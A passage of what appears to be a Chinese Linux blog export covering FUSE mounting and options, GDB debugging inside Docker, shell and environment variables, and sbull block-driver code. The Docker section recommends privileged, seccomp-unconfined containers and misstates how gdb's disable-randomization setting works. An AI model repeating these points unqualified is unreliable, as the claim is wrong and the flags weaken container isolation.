<li>使用GDB调试<code>myfuse</code>，参数中增加<code>-d</code>参数，该参数可以使<code>myfuse</code>不已守护进程方式启动 ( ** Version: 2.9.9上无法实现 ** )</li>
<li>在<code>myfuse</code>中增加调试打印信息进行调试</li>
</ul>
<h3 id="挂载FUSE"><a href="#挂载FUSE" class="headerlink" title="挂载FUSE"></a>挂载FUSE</h3><p>先创建一个目录(<code>mkdir ./mp</code>)，用于挂载<code>myfuse</code>文件系统，然后调用<code>myfuse</code>进行挂载。<br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./myfuse ./mp</span><br></pre></td></tr></table></figure>
<p>对于mac系统挂载文件系统需要使用参数<code>-o allow_other</code>，否则挂在后，挂载目录将无权访问。<br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./myfuse ./mp -o allow_other</span><br></pre></td></tr></table></figure>
<p>使用<code>mount</code>查看挂载的文件系统。<br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mount</span></span><br><span class="line">...</span><br><span class="line">/home/xxxx/xxxx/myfuse on /home/xxxx/xxxx/mp type fuse.myfuse (rw,nosuid,nodev,relatime,user_id=1000,group_id=1000)</span><br></pre></td></tr></table></figure>

<p>使用<code>ls ./mp</code>查看挂载点内容，根据实现应提示<code>Hello-world</code><br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> ./mp/</span></span><br><span class="line">Hello-world</span><br></pre></td></tr></table></figure>

<h3 id="卸载FUSE"><a href="#卸载FUSE" class="headerlink" title="卸载FUSE"></a>卸载FUSE</h3><p>使用<code>umount</code>卸载<code>myfuse</code>文件系统，需要输入挂载点的全路径<br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo umount /home/xxxx/xxxx/mp</span><br></pre></td></tr></table></figure>

<h2 id="FUSE-Options说明"><a href="#FUSE-Options说明" class="headerlink" title="FUSE Options说明"></a>FUSE Options说明</h2><p><code>fuse_main</code>函数自带usage信息，只需要将<code>--help</code>参数传入，便能将usage信息打出来。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./myfuse --<span class="built_in">help</span></span></span><br><span class="line">usage: ./myfuse mountpoint [options]</span><br><span class="line"></span><br><span class="line">general options:</span><br><span class="line">    -o opt,[opt...]        mount options</span><br><span class="line">    -h   --help            print help</span><br><span class="line">    -V   --version         print version</span><br><span class="line"></span><br><span class="line">FUSE options:</span><br><span class="line">    -d   -o debug          enable debug output (implies -f)</span><br><span class="line">    -f                     foreground operation</span><br><span class="line">    -s                     disable multi-threaded operation</span><br><span class="line"></span><br><span class="line">    -o allow_other         allow access to other users</span><br><span class="line">    -o allow_root          allow access to root</span><br><span class="line">    -o auto_unmount        auto unmount on process termination</span><br><span class="line">    -o nonempty            allow mounts over non-empty file/dir</span><br><span class="line">    -o default_permissions enable permission checking by kernel</span><br><span class="line">    -o fsname=NAME         set filesystem name</span><br><span class="line">    -o subtype=NAME        set filesystem type</span><br><span class="line">    -o large_read          issue large read requests (2.4 only)</span><br><span class="line">    -o max_read=N          set maximum size of read requests</span><br><span class="line">    </span><br><span class="line">    -o hard_remove         immediate removal (don&#x27;t hide files)</span><br><span class="line">    -o use_ino             let filesystem set inode numbers</span><br><span class="line">    -o readdir_ino         try to fill in d_ino in readdir</span><br><span class="line">    -o direct_io           use direct I/O</span><br><span class="line">    -o kernel_cache        cache files in kernel</span><br><span class="line">    -o [no]auto_cache      enable caching based on modification times (off)</span><br><span class="line">    -o umask=M             set file permissions (octal)</span><br><span class="line">    -o uid=N               set file owner</span><br><span class="line">    -o gid=N               set file group</span><br><span class="line">    -o entry_timeout=T     cache timeout for names (1.0s)</span><br><span class="line">    -o negative_timeout=T  cache timeout for deleted names (0.0s)</span><br><span class="line">    -o attr_timeout=T      cache timeout for attributes (1.0s)</span><br><span class="line">    -o ac_attr_timeout=T   auto cache timeout for attributes (attr_timeout)</span><br><span class="line">    -o noforget            never forget cached inodes</span><br><span class="line">    -o remember=T          remember cached inodes for T seconds (0s)</span><br><span class="line">    -o nopath              don&#x27;t supply path if not necessary</span><br><span class="line">    -o intr                allow requests to be interrupted</span><br><span class="line">    -o intr_signal=NUM     signal to send on interrupt (10)</span><br><span class="line">    -o modules=M1[:M2...]  names of modules to push onto filesystem stack</span><br><span class="line">    -o max_write=N         set maximum size of write requests</span><br><span class="line">    -o max_readahead=N     set maximum readahead</span><br><span class="line">    -o max_background=N    set number of maximum background requests</span><br><span class="line">    -o congestion_threshold=N  set kernel&#x27;s congestion threshold</span><br><span class="line">    -o async_read          perform reads asynchronously (default)</span><br><span class="line">    -o sync_read           perform reads synchronously</span><br><span class="line">    -o atomic_o_trunc      enable atomic open+truncate support</span><br><span class="line">    -o big_writes          enable larger than 4kB writes</span><br><span class="line">    -o no_remote_lock      disable remote file locking</span><br><span class="line">    -o no_remote_flock     disable remote file locking (BSD)</span><br><span class="line">    -o no_remote_posix_lock disable remove file locking (POSIX)</span><br><span class="line">    -o [no_]splice_write   use splice to write to the fuse device</span><br><span class="line">    -o [no_]splice_move    move data while splicing to the fuse device</span><br><span class="line">    -o [no_]splice_read    use splice to read from the fuse device</span><br></pre></td></tr></table></figure>

<h2 id="FUSE-Operations说明"><a href="#FUSE-Operations说明" class="headerlink" title="FUSE Operations说明"></a>FUSE Operations说明</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">fuse_operations</span> &#123;</span><br><span class="line">    <span class="built_in">int</span> (*getattr) (<span class="type">const</span> <span class="type">char</span> *, <span class="keyword">struct</span> stat *);</span><br><span class="line">    <span class="comment">/* 这个函数与 stat() 类似。st_dev 和 st_blksize 域都可以忽略。st_ino 域也会被忽略，除非在执行 mount 时指定了 use_ino 选项 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*readlink) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="comment">/* 这个函数会读取一个符号链接的目标。缓冲区应该是一个以 null 结束的字符串。缓冲区的大小参数包括这个 null 结束字符的空间。如果链接名太长，不能保存到缓冲区中，就应该被截断。成功时的返回值应该是 “0” */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*getdir) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">fuse_dirh_t</span>, <span class="type">fuse_dirfil_t</span>);</span><br><span class="line">    <span class="comment">/* 这个函数会读取一个目录中的内容。这个操作实际上是在一次调用中执行 opendir()、readdir()、...、closedir() 序列。对于每个目录项来说，都应该调用 filldir() 函数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*mknod) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">mode_t</span>, <span class="type">dev_t</span>);</span><br><span class="line">    <span class="comment">/* 这个函数会创建一个文件节点。此处没有 create() 操作；mknod() 会在创建非目录、非符号链接的节点时调用 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*mkdir) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">mode_t</span>);</span><br><span class="line">    <span class="built_in">int</span> (*rmdir) (<span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">    <span class="comment">/* 这两个函数分别用来创建和删除一个目录 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*unlink) (<span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">    <span class="built_in">int</span> (*rename) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">    <span class="comment">/* 这两个函数分别用来删除和重命名一个文件 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*symlink) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">    <span class="comment">/* 这个函数用来创建一个符号链接 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*link) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">    <span class="comment">/* 这个函数创建一个到文件的硬链接 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*chmod) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">mode_t</span>);</span><br><span class="line">    <span class="built_in">int</span> (*chown) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">uid_t</span>, <span class="type">gid_t</span>);</span><br><span class="line">    <span class="built_in">int</span> (*truncate) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">off_t</span>);</span><br><span class="line">    <span class="built_in">int</span> (*utime) (<span class="type">const</span> <span class="type">char</span> *, <span class="keyword">struct</span> utimbuf *);</span><br><span class="line">    <span class="comment">/* 这 4 个函数分别用来修改文件的权限位、属主和用户、大小以及文件的访问/修改时间 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*open) (<span class="type">const</span> <span class="type">char</span> *, <span class="keyword">struct</span> fuse_file_info *);</span><br><span class="line">    <span class="comment">/* 这是文件的打开操作。对 open() 函数不能传递创建或截断标记（O_CREAT、O_EXCL、O_TRUNC）。这个函数应该检查是否允许执行给定的标记的操作。另外，open() 也可能在 fuse_file_info 结构中返回任意的文件句柄，这会传递给所有的文件操作 */</span></span><br><span class="line">    <span class="built_in">int</span> (*read) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">off_t</span>, <span class="keyword">struct</span> fuse_file_info *);</span><br><span class="line">    <span class="comment">/* 这个函数从一个打开文件中读取数据。除非碰到 EOF 或出现错误，否则 read() 应该返回所请求的字节数的数据；否则，其余数据都会被替换成 0。一个例外是在执行 mount 命令时指定了 direct_io 选项，在这种情况中 read() 系统调用的返回值会影响这个操作的返回值 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*write) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">off_t</span>,<span class="keyword">struct</span> fuse_file_info *);</span><br><span class="line">    <span class="comment">/* 这个函数将数据写入一个打开的文件中。除非碰到 EOF 或出现错误，否则 write() 应该返回所请求的字节数的数据。一个例外是在执行 mount 命令时指定了 direct_io 选项（这于 read() 操作的情况类似） */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*statfs) (<span class="type">const</span> <span class="type">char</span> *, <span class="keyword">struct</span> statfs *);</span><br><span class="line">    <span class="comment">/* 这个函数获取文件系统的统计信息。f_type 和 f_fsid 域都会被忽略 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*flush) (<span class="type">const</span> <span class="type">char</span> *, <span class="keyword">struct</span> fuse_file_info *);</span><br><span class="line">    <span class="comment">/* 这表示要刷新缓存数据。它并不等于 fsync() 函数 —— 也不是请求同步脏数据。每次对一个文件描述符执行 close() 函数时，都会调用 flush()；因此如果文件系统希望在 close() 中返回写错误，并且这个文件已经缓存了脏数据，那么此处就是回写数据并返回错误的好地方。由于很多应用程序都会忽略 close() 错误，因此这通常用处不大 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*release) (<span class="type">const</span> <span class="type">char</span> *, <span class="keyword">struct</span> fuse_file_info *);</span><br><span class="line">    <span class="comment">/* 这个函数释放一个打开文件。release() 是在对一个打开文件没有其他引用时调用的 —— 此时所有的文件描述符都会被关闭，所有的内存映射都会被取消。对于每个 open() 调用来说，都必须有一个使用完全相同标记和文件描述符的 release() 调用。对一个文件打开多次是可能的，在这种情况中只会考虑最后一次 release，然后就不能再对这个文件执行更多的读/写操作了。release 的返回值会被忽略 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*fsync) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span>, <span class="keyword">struct</span> fuse_file_info *);</span><br><span class="line">    <span class="comment">/* 这个函数用来同步文件内容。如果 datasync 参数为非 0，那么就只会刷新用户数据，而不会刷新元数据 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> (*setxattr) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">int</span> (*getxattr) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="built_in">int</span> (*listxattr) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="built_in">int</span> (*removexattr) (<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">    <span class="comment">/* 这些函数分别用来设置、获取、列出和删除扩展属性 */</span></span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>更多详细说明，请见<code>fuse.h</code>文件。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.jeffli.me/blog/2014/08/30/use-gdb-to-understand-fuse-file-system/">Use GDB to Understand FUSE File System</a></li>
<li><a href="http://blog.csdn.net/langeldep/article/details/6401567">FUSE API 的两种使用方法</a></li>
<li><a href="http://ouonline.net/building-your-own-fs-with-fuse-1">使用 fuse 编写文件系统 (1)</a></li>
<li><a href="https://github.com/osxfuse/osxfuse/issues/45">cannot umount or mount an sshfs volume after ssh connection cut</a></li>
<li><a href="http://www.tuicool.com/articles/qAjARfY">Fuse文件系统优化方案</a></li>
<li><a href="http://www.tuicool.com/articles/6F7Fzi">FUSE源码剖析</a></li>
<li><a href="http://www.ibm.com/developerworks/cn/linux/l-fuse/">使用 FUSE 开发自己的文件系统</a></li>
<li><a href="https://github.com/gerard/ext4fuse/issues/36">ext4fuse issues</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>FUSE</tag>
        <tag>filesystem</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker中使用GDB调试</title>
    <url>/2019/09/24/linux/gdb-in-docker/</url>
    <content><![CDATA[<p>** 背景 **</p>
<p>容器是一个很老的技术，但这几年却很火热。好多应用都已经容器化了，只要是在用户空间运行的，几乎都可以被容器化。就是放到docker里运行。</p>
<p>面对着容器里运行的应用程序它与外界隔离了，这种隔离有优点，也有缺点。今天我们不讲优点，说一说它的一个缺点。。。</p>
<p>如果你是在linux上写C&#x2F;C++的朋友，你肯定会用到gdb这个神一样的调试工具。在当下这么火爆的容器面前，你的APP可能早就被扔到容器里了。</p>
<p>有一天，除了一个问题，需要你用gdb去调试一下，我靠，ns完全是隔离的，根本无法调试，火大了吧，别急！我来帮你～v～</p>
<h1 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>其实gdb调试容器内app也不难，只要做到两点就可以成功调试了。</p>
<ol>
<li>你所使用的镜像里必须得有gdb工具，没有怎么调试啊。要么做镜像的时候将gdb安装进去，要么使你的gdb与被调试app的容器处于同一命名空间。</li>
<li>使用一些工具(nsenter)侵入到容器命名空间后再运行gdb调试。eg: <code>sudo nsenter -t &#123;容器的PID&#125; -m -p gdb -p &#123;容器内被调试app的PID&#125;</code></li>
</ol>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>方法二也需要在被调试的容器上先装有gdb，然后在启动容器的时候通过增加一些特权参数。待需要调试的时候直接登录到容器内就可以调试了。</p>
<ol>
<li>在启动docker容器的时候需要增加<code>--privileged</code>参数</li>
<li>由于gdb调试需要的<code>SYS_PTRACE</code>属性被禁止掉了，所以在启动容器时候需要增加这个属性<code>--cap-add sys_ptrace</code></li>
<li>gdb调试时，需要关闭linux虚拟地址随机化（虚拟地址随机化是为了安全考虑而出现的，gdb调试只是暂时关闭）。关闭有两种方法，一是通过gdb的命令<code>set disable-randomization off</code>关闭。二是通过设置docker的参数<code>--security-opt seccomp=unconfined</code>。</li>
</ol>
<p>有此三步，可保gdb无告警，并正常使用。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.jianshu.com/p/1c4476c3d0ee?from=groupmessage">如何在docker中进行gdb调试</a></li>
<li><a href="https://yq.aliyun.com/articles/674757">为什么在Docker里使用gdb调试器会报错</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux环境变量</title>
    <url>/2019/09/20/linux/linux-env-variable/</url>
    <content><![CDATA[<p>说起环境变量，可能首先想到的是shell中敲入<code>env</code>所看到的这些。没错，这些的确是环境变量。</p>
<p>还有吗。。。<br>有！你再试试<code>set</code>命令，看看是不是比<code>env</code>的多啊。是不是有点儿小懵逼。怎么还不一样呢！<code>set</code>看到的是shell变量，那shell变量是环境变量吗？是。</p>
<p>还有吗。。。<br>有！在你输入<code>set</code>的时候你看到<code>$@</code>、<code>$?</code>这些了吗？貌似没有吧。据说这些属于系统变量。(听说而已。。。)</p>
<p>还有吗。。。<br>目前为止，我只知道这么多，如果我了解到更多的再补充吧。</p>
<p>说了这么多，上一张图，就一目了然了。</p>
<p><img src="/images/linux/linux_env_variable.jpg" alt="linux_env_variable"></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.jianshu.com/p/fec33aed017b">Linux:环境变量 - set、env、export</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux块设备驱动——sbull</title>
    <url>/2018/12/25/linux/kernel-module-sbull/</url>
    <content><![CDATA[<p>块设备驱动程序，linux内核中的一类驱动程序。通过传输固定大小的随机数据来访问设备。</p>
<h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><h2 id="注册块设备驱动"><a href="#注册块设备驱动" class="headerlink" title="注册块设备驱动"></a>注册块设备驱动</h2><p>向内核注册设备驱动程序使用函数<code>int register_blkdev(unsigned int major, const char *name);</code>(linux&#x2F;fs.h)，参数是该设备使用的主设备号和名称(名字在<code>/proc/devices</code>中显示)。若传入的主设备号为0，内核将分配一个新的主设备号，并将该设备号返回给调用者；失败则返回负值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">sbull_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    sbull_major = register_blkdev(sbull_major,<span class="string">&quot;sbull&quot;</span>); <span class="comment">// 注册块设备，第一个是设备号，0为动态</span></span><br><span class="line">    <span class="keyword">if</span>(sbull_major &lt;= <span class="number">0</span>)&#123;                               <span class="comment">//分配，第二个是设备名</span></span><br><span class="line">        printk(KERN_WARNING <span class="string">&quot;sbull:unable to get major number\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EBUSY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 为块核心数据结构 sbull_dev 分配空间*/</span></span><br><span class="line">    Devices = kmalloc(ndevices *<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sbull_dev),GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(Devices == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> out_unregister;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; ndevices;i++)       <span class="comment">/* 初始化 sbull_dev 核心数据结构 */</span></span><br><span class="line">        setup_device(Devices + i,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">out_unregister:</span><br><span class="line">    unregister_blkdev(sbull_major,<span class="string">&quot;sbd&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于<code>register_blkdev</code>的调用是可选的，该接口所做的事情是：如果需要的话分配一个动态的主设备号；在<code>/proc/devices</code>中创建一个入口项。</p>
<h2 id="注册磁盘"><a href="#注册磁盘" class="headerlink" title="注册磁盘"></a>注册磁盘</h2><p>内核使用<code>gendisk</code>结构(<code>linux/genhd.h</code>)来表示一个独立的磁盘设备。内核还使用该结构体表示分区。该结构中的许多成员必须由驱动程序进行初始化。</p>
<ul>
<li>major<br>  <code>int major;</code>主设备号</li>
<li>first_minor<br>  <code>int first_minor;</code>一个驱动器至少使用一个次设备号，如果驱动器是可被分区的用户将要为每个可能的分区都分配一个次设备号。</li>
<li>minors<br>  <code>int minors;</code>常取16，一个完整的磁盘可以包含15个分区。</li>
<li>disk_name<br>  <code>char disk_name[32];</code>磁盘设备名字，该名字显示在<code>/proc/partitions</code>和<code>sysfs</code>中。</li>
<li>fops<br>  <code>struct block_device_operations *fops;</code>块设备操作</li>
<li>queue<br>  <code>struct request_queue *queue;</code>设备I&#x2F;O请求队列</li>
<li>flags<br>  <code>int flags;</code>驱动器状态标志。可移动介质将被设置为<code>GENHD_FL_REMOVABLE</code>；CD-ROM设备被设置为<code>GENHD_FL_CD</code>；若不希望在<code>/proc/partitions</code>中显示分区信息可设置为<code>GENHD_FL_SUPPRESS_PARTITION_INFO</code></li>
<li>capacity<br>  <code>sector_t capacity;</code>以512字节为一个扇区，该驱动器可以包含的扇区数。驱动程序不能直接设置该成员，而要将扇区数传给<code>set_capacity</code></li>
<li>private_data<br>  <code>void *private_data;</code>块设备驱动可以使用该成员保存指向其内部数据的指针</li>
</ul>
<p><code>gendisk</code>是一个动态分配的结构，驱动程序不能自己动态分配该结构，必须使用<code>alloc_disk</code>分配，使用<code>del_gendisk</code>回收。</p>
<ul>
<li>alloc_disk<br>  <code>struct gendisk *alloc_disk(int minors);</code>参数<code>minors</code>是该磁盘使用的次设备号的数目。为了能正常工作，<code>minors</code>传入后就不能更改了。</li>
<li>add_disk<br>  <code>void add_disk(struct gendisk *gd);</code>使用<code>alloc_disk</code>分配的<code>gendisk</code>不能使磁盘对系统可用，还需要<code>add_disk</code>将磁盘设备激活，并随时准备调用它提供的方法。在驱动程序完全被初始化并且能够响应对磁盘的请求前，请不要调用<code>add_disk</code></li>
<li>get_disk and put_disk<br>  <code>gendisk</code>是一个引用技术结构，<code>get_disk</code>和<code>put_disk</code>函数负责处理引用计数。</li>
<li>del_gendisk<br>  <code>void del_gendisk(struct gendisk *gd);</code>调用<code>del_gendisk</code>会删除<code>gendisk</code>中的最终计数。当没有用户继续使用时，将真正删除该结构。此后，在系统中不会找到该设备信息。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">setup_device</span><span class="params">(<span class="keyword">struct</span> sbull_dev *dev,<span class="type">int</span> which)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dev,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sbull_dev));    <span class="comment">/* 初始化 dev 所指内容为0*/</span></span><br><span class="line">    dev-&gt;size = nsectors * hardsect_size;</span><br><span class="line">    dev-&gt;data = vmalloc(dev-&gt;size);</span><br><span class="line">    <span class="keyword">if</span>(dev-&gt;data == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_NOTICE <span class="string">&quot;vmalloc failure.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_lock_init(&amp;dev-&gt;lock);               <span class="comment">/* 初始化自旋锁*/</span></span><br><span class="line">    <span class="comment">/* 在分配请求队列前要先初始化自旋锁*/</span></span><br><span class="line">    <span class="comment">/* The timer which &quot;invalidates the device给内核定时器初始化 &quot;*/</span></span><br><span class="line">    init_timer(&amp;dev-&gt;timer); <span class="comment">/*初始化定时器，实际将结构中的list成员初始化为空*/</span>            </span><br><span class="line">    dev-&gt;timer.data = (<span class="type">unsigned</span> <span class="type">long</span>)dev;   <span class="comment">/*被用作function函数的调用参数*/</span></span><br><span class="line">    dev-&gt;timer.function = sbull_invalidate; <span class="comment">/* 当定时器到期时，就执行function指定的函数*/</span></span><br><span class="line">                                                                 </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The I/O queue, depending on whether we are using our own</span></span><br><span class="line"><span class="comment">     * make_request function or not.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">switch</span>(request_mode)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> RM_NOQUEUE:</span><br><span class="line">            dev-&gt;<span class="built_in">queue</span> = blk_alloc_queue(GFP_KERNEL);  <span class="comment">/* 分配“请求队列” */</span></span><br><span class="line">            <span class="keyword">if</span>(dev-&gt;<span class="built_in">queue</span> == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out_vfree;</span><br><span class="line">            blk_queue_make_request(dev-&gt;<span class="built_in">queue</span>,sbull_make_request); <span class="comment">/*绑定&quot;制造请求&quot;函数 */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> RM_FULL:</span><br><span class="line">            dev-&gt;<span class="built_in">queue</span> = blk_init_queue(sbull_full_request,&amp;dev-&gt;lock); <span class="comment">/*请求队列初始化*/</span></span><br><span class="line">            <span class="keyword">if</span>(dev-&gt;<span class="built_in">queue</span> == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out_vfree;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> RM_SIMPLE:</span><br><span class="line">            dev-&gt;<span class="built_in">queue</span> = blk_init_queue(sbull_request,&amp;dev-&gt;lock); <span class="comment">/*请求队列初始化*/</span></span><br><span class="line">            <span class="keyword">if</span>(dev-&gt;<span class="built_in">queue</span> == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out_vfree;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printk(KERN_NOTICE <span class="string">&quot;Bad request mode %d,using simple\n&quot;</span>,request_mode);     </span><br><span class="line">    &#125;</span><br><span class="line">    blk_queue_hardsect_size(dev-&gt;<span class="built_in">queue</span>,hardsect_size);  <span class="comment">/* 硬件扇区尺寸设置 */</span></span><br><span class="line">    dev-&gt;<span class="built_in">queue</span>-&gt;queuedata = dev;</span><br><span class="line">    dev-&gt;gd = alloc_disk(SBULL_MINORS);             <span class="comment">/* 动态分配 gendisk 结构体*/</span></span><br><span class="line">    <span class="keyword">if</span>(!dev-&gt;gd)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_NOTICE <span class="string">&quot;alloc_disk failure\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> out_vfree;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 初始化 gendisk */</span></span><br><span class="line">    dev-&gt;gd-&gt;major = sbull_major;                 <span class="comment">/* 主设备号 */</span></span><br><span class="line">    dev-&gt;gd-&gt;first_minor = which * SBULL_MINORS;  <span class="comment">/* 第一个次设备号 */</span></span><br><span class="line">    dev-&gt;gd-&gt;fops = &amp;sbull_ops;                   <span class="comment">/* 块设备操作结构体 */</span></span><br><span class="line">    dev-&gt;gd-&gt;<span class="built_in">queue</span> = dev-&gt;<span class="built_in">queue</span>;                  <span class="comment">/* 请求队列 */</span></span><br><span class="line">    dev-&gt;gd-&gt;private_data = dev;                  <span class="comment">/* 私有数据 */</span></span><br><span class="line">    <span class="built_in">snprintf</span>(dev-&gt;gd-&gt;disk_name,<span class="number">32</span>,<span class="string">&quot;sbull%c&quot;</span>,which + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="comment">/* 每个请求的大小都是扇区大小的整数倍，内核总是认为扇区大小是512字节，因此必须进行转换*/</span></span><br><span class="line">    set_capacity(dev-&gt;gd,nsectors*(hardsect_size/KERNEL_SECTOR_SIZE));</span><br><span class="line">    add_disk(dev-&gt;gd);  <span class="comment">/* 完成以上初始化后，调用 add_disk 函数来注册这个磁盘设备 */</span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">             </span><br><span class="line">out_vfree:</span><br><span class="line">    <span class="keyword">if</span>(dev-&gt;data)</span><br><span class="line">        vfree(dev-&gt;data);       <span class="comment">/* 释放用 vmalloc 申请的不连续空间*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="逆初始化"><a href="#逆初始化" class="headerlink" title="逆初始化"></a>逆初始化</h1><h2 id="注销块设备驱动"><a href="#注销块设备驱动" class="headerlink" title="注销块设备驱动"></a>注销块设备驱动</h2><p>与<code>register_blkdev</code>对应的注销函数为<code>int unregister_blkdev(unsigned int major, const char *name);</code>，传入的参数与传递给<code>register_blkdev</code>的参数必须匹配。</p>
